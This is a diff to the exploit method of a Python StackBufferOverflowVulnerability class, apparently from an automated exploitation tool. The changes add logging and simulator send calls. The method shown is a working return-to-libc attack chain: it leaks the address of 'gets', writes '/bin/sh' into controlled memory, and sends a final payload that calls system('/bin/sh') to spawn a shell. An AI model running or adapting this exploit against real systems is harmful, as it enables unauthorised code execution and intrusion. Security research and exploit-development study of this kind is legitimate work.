@@ -146,6 +146,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
     # TODO: gate on detect
     def exploit(self, conn):
+        logger.info("hi")
         sconn = conn.conn
         function_addr = int(self.function["address"], 16) 
         
@@ -168,13 +169,14 @@ class StackBufferOverflowVulnerability(Vulnerability):
         else:
             logger.info("Navigating to targetFunc.")
             conn.navigate(int(self.targetFunc["address"],16))
-
-        res = sconn.recv()
-        logger.debug(f"Initial: {res}")
+        
+        #res = sconn.recv()
+        #logger.debug(f"Initial: {res}")
 
         # read libc location
         logger.info("Sending first payload (to leak 'gets' location)")
         sconn.sendline(payload1)
+        conn.sim_sendline(payload1)
 
         # Need to perform drain of non libc stuff
         if self.suffix:
@@ -182,7 +184,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             res = sconn.recvuntil(self.suffix)
             logger.debug(f"Received suffix: {res}")
         else:
-            logger.info("Navigating to function exit")
+            logger.info(f"Navigating to function exit {self.functionExit}")
             conn.navigate(int(self.functionExit,16))
 
         # We've hit the return, next output is now the 'gets' address
@@ -210,6 +212,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         payload2 = sm.resolve(binary=0x0)
         
         logger.info("Sending second payload (setup write to controlled memory)")
+        conn.sim_sendline(payload2)
         sconn.sendline(payload2)
         logger.info("Navigating to return.")
         if self.suffix:
@@ -223,6 +226,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # we have exited the function, we can now
         # write /bin/sh to a controlled part of memory
         logger.info(f"Writing '/bin/sh' to {hex(target_heap_address)}")
+        conn.sim_sendline(b"/bin/sh\x00")
         sconn.sendline(b"/bin/sh\x00")
 
         # need to navigate back to the targetFunc
@@ -244,6 +248,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
         logger.info("Sending final payload (invoke system('bin/sh'))")
         sconn.sendline(payload3)
+        conn.sim_sendline(payload3)
         
         # Payload sent, now exit the function.
         if self.suffix:
